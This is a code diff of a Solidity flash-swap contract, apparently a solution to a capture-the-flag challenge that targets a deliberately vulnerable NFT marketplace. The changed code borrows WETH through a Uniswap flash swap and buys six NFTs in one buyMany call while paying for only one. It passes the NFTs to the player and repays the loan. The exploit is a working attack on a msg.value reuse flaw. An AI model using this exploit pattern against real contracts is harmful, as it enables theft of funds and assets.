@@ -46,6 +46,7 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
         
         return IERC721Receiver.onERC721Received.selector;
       }
+      
   function flashSwap(address _tokenBorrow, uint _amount) external {
     address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
     require(pair != address(0), "!pair");
@@ -93,25 +94,21 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
     emit Log("fee", fee);
     console.log("amount to repay", amountToRepay);
 
-    //OPTIONAL - check balance of tokens to verify the loan
+    //exploit the freerider marketplace
     uint256 balance0 = IERC20(token0).balanceOf(address(this));
-    uint256 balance1 = IERC20(token1).balanceOf(address(this));
-    emit Log("After BALANCE TOKEN 0", balance0);
-    emit Log("After BALANCE TOKEN 1", balance1);
-    console.log("After BALANCE TOKEN 0: ", balance0);
-    console.log("After BALANCE TOKEN 1: ", balance1);
-
     WETH wethContract = WETH(tokenBorrow);
     console.log("contract Balance: ", address(this).balance);
     wethContract.withdraw(balance0);
-    console.log("Now contract Balance: ", address(this).balance); 
+    console.log("Current  contract Balance: ", address(this).balance); 
+    uint256[] memory ts = new uint256[](6);
+    ts[0] = 0;ts[1] = 1;ts[2] = 2;ts[3] = 3;ts[4] = 4;ts[5] = 5;
+    market.buyMany{value: 15 ether}(ts);
+    console.log("after Buy Many contract balance", address(this).balance);
+
     for(uint8 i = 0; i< 6 ; i ++) {
-      uint256[] memory tokenIds = new uint256[](1);
-      tokenIds[0] = i;
-      market.buyMany{value: 15 ether}(tokenIds);
-      console.log("after Buy Many", address(this).balance);
       nft.transferFrom(address(this), player, i);
     }
+    console.log("after Buy Many marketplace balance", address(market).balance);
     wethContract.deposit{value:amountToRepay}();
     wethContract.transfer(pair, amountToRepay);
   }
